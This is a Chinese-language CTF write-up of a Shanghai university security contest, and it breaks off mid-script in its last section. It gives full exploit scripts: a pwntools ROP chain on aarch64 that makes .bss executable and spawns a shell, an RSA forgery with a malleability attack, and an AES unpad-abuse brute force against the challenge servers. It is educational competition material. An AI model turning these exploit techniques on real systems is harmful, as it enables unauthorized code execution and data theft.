利用周末打了上海市大学生网络安全大赛，最后打了第三，这次的 Misc 真的是难上天，除了签到其他都做不动...膜一波复旦的师傅们。比赛中我打的是
Crypto 和部分 Web，这里也贴了一些队友的 wp。
### Misc
#### 签到
直接 base32 解码。
### Pwn
#### baby_arm
arm 架构，核心思想是改掉 mprotect 函数的参数，使 bss 段可执行。
exp如下：
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    
    from pwn import *
    import os
    context.arch = 'aarch64'
    p = remote('106.75.126.171', 33865)
    start = p64(0x4007D8)+asm(shellcraft.aarch64.linux.sh())
    p.sendafter('Name:', start.ljust(512, '\x00'))
    padding='a'*0x48
    pop=0x4008CC
    lea=0x4008ac
    bss= 0x411068
    payload = flat(padding, pop, 0, lea, 0, 1, bss, 7, 0x1000, 0, p64(0x411070)*0x100)
    p.send(payload)
    p.interactive()
### Crypto
#### rsaaaaa
这道题有两个点，第一个点是 RSA 中给定 m 和 c，提供 d 和
n，这里脚本随机生成的公私钥，想要直接获取基本不可能，我们看到服务器脚本只判断了一个等式：
只要满足 `pow(c,D,N) == m` 即可，所以我们可以自己选定一个 d,然后令 `n=pow(c,d)-m` 即可。
第二个点是下面这段代码：
这里给了我们一次解密的机会，但不允许解密明文，这个考点在之前的 suctf 出过，思路是让服务器解密`(c*pow(2,e,n))%n` ，这样得到的明文是
`2*m`，除2即可。
脚本如下：（拿 socket 写的，比较丑）
    # -*- coding: utf-8 -*-    from hashlib import sha512
    import socket
    import string
    import re
    from Crypto.Util.number import *
    from Crypto.Cipher import AES
    HOST='106.75.101.197'
    PORT=7544
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    def brute_force(pad, shavalue):
        dict = string.letters + string.digits
        key = ""
        for i1 in dict:
            tmp = key
            key1 = tmp + i1
            for i2 in dict:
                tmp = key1
                key2 = tmp + i2
                for i3 in dict:
                    tmp = key2
                    key3 = tmp + i3
                    for i4 in dict:
                        tmp = key3
                        key4 = tmp + i4
                        final_key = key4
                        if sha512(pad+key4).hexdigest()==shavalue:
                            print key4
                            return key4
    content = sock.recv(1024).strip()
    print content
    pad=content[20+7:20+7+16]
    hash=content[20+33:]
    print pad
    print hash
    sock.recv(1024).strip()
    sock.send(str(brute_force(pad,hash))+"\n")
    print sock.recv(1024).strip()
    content=sock.recv(1024).strip()
    print content
    m=int(re.findall(":(.+?)\nand",content)[0],16)
    c=int(re.findall("ciphertext:0x(.+)",content)[0],16)
    d=97
    n=pow(c,d)-m
    print n
    print sock.recv(1024).strip()
    sock.send(str(n)+"\n")
    print sock.recv(1024).strip()
    sock.send(str(d)+"\n")
    print sock.recv(1024).strip()
    msg1 = hex(m)[2:-1].decode('hex')
    content=sock.recv(1024).strip()
    print content
    n=int(re.findall("n=(.+?)\n",content)[0],16)
    e=int(re.findall("e=(.+?)\n",content)[0],16)
    c=re.findall("c=(.+)",content)[0]
    c=c+sock.recv(1024).strip()
    c=int(c,16)
    print c
    print sock.recv(1024).strip()
    sock.send(str((c*pow(2,e,n))%n)+"\n")
    content=sock.recv(1024).strip()
    print content
    m=int(re.findall("message:0x(.+)",content)[0],16)
    sock.recv(1024).strip()
    msg2 = hex(m/2)[2:-1].decode('hex')
    sock.send(str(m/2)+"\n")
    print sock.recv(1024).strip()
    content=sock.recv(1024).strip()
    flag=re.findall("flag:0x(.+)",content)[0]
    flag=flag.decode("hex")
    cipher = AES.new(msg2, AES.MODE_CBC, msg1)
    print cipher.decrypt(flag)
这个题我用 socket 遇到了一个坑点，就是在收到服务器发来的 n,e,c 时，接受到 c 后服务器又发来了一个大约 29 长度的 16
进制数，我开始不知道是什么，结果脚本死活过不了，发过去的结果不对。
卡了好久，之后发现 c 的位数好像有点少，才明白那个 16 进制原来是 c 的后面一部分... 不知为何给我发过来的时候分了两步发送，所以才有我的这段代码：
    c=re.findall("c=(.+)",content)[0]
    c=c+sock.recv(1024).strip()
    c=int(c,16)
最后：
> flag{ec35162f-94b3-47e4-8d2c-6da6bba0391f}
#### aessss
这个题目问题出在 padding 的时候，由于不足 256 位要进行 padding，padding 的字节也就是缺的字节数，但是如果明文够 256
字节，那么按照代码写的就不进行padding：
    def pad(self, s):
            s += (256 - len(s)) * chr(256 - len(s))
            ret = ['\x00' for _ in range(256)]
            for index, pos in enumerate(self.s_box):
                ret[pos] = s[index]
            return ''.join(ret)
最大的问题出在 unpad 上，unpad 没有进行检查，仅仅通过最后一个字节来判断填充的字节数。
    def unpad(self, s):
            ret = ['\x00' for _ in range(256)]
            for index, pos in enumerate(self.invs_box):
                ret[pos] = s[index]
            return ''.join(ret[0:-ord(ret[-1])])
而且服务器提供了加密当前的 flag 以及对当前的 flag 后面追加信息的功能，我们的利用思路如下：
  1. 选择 choice2，追加 `256-33 =223`字节，使当前 flag 不需要填充，追加的最后一个字节设置成`chr(256-32=224)`
  2. 服务器对 flag 追加我们的信息，并进行 s 盒替换，结果赋给类中的 flag 变量。
  3. 我们再次选择 choice2，这里由于我们需要追加，服务器会将类中的 flag 变量取出进行逆 S 盒替换和 unpad，这样按照这个 unpad 算法会把后面 224 字节的全部当成 padding去掉，明文剩下了真正 flag 的前32位
  4. 我们此时输入一个字符 i,那么此时加密的对象就是`flag[:32]+i`
  5. 选择 choice1 对当前 flag 加密，控制 i 进行爆破，如果得到的密文和最初的 flag 加密的密文一样，就得到了 flag 的最后一个字节
  6. 逐字节爆破，直至获取全部的 flag。
解题脚本如下：
    # -*- coding: utf-8 -*-    from hashlib import sha256
    import socket
    import string
    HOST='106.75.13.64'
    PORT=54321
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    def brute_force(pad, shavalue):
        dict = string.letters + string.digits
        key = ""
        for i1 in dict:
            tmp = key
            key1 = tmp + i1
            for i2 in dict:
                tmp = key1
                key2 = tmp + i2
                for i3 in dict:
                    tmp = key2
                    key3 = tmp + i3
                    for i4 in dict:
                        tmp = key3
                        key4 = tmp + i4
                        final_key = key4
                        if sha256(key4+pad).hexdigest()==shavalue:
                            print key4
                            return key4
    def choice1():
        sock.send("1\n")
        result=sock.recv(1024).strip()[30:]
        sock.recv(1024).strip()
        return result
    def choice2(pad):
        sock.send("2\n")
        sock.recv(1024).strip()
        sock.send(pad+"\n")
        sock.recv(1024).strip()
        sock.recv(1024).strip()
    def choice3(str):
        sock.send("3\n")
        sock.recv(1024).strip()
        sock.send(str+"\n")
        result=sock.recv(1024).strip()[33:]
        sock.recv(1024).strip()
        return result
    content = sock.recv(1024).strip()
    pad=content[12:12+16]
    hash=content[33:33+64]
    sock.recv(1024).strip()
    sock.send(str(brute_force(pad,hash))+"\n")
    print sock.recv(1024).strip()
    flag_enc=choice1()
    flag=""
    for i in range(33):
        a = ''.join(['a' for _ in range(223)])
        a = a[:-1] + chr(224+i)
        for c in string.printable: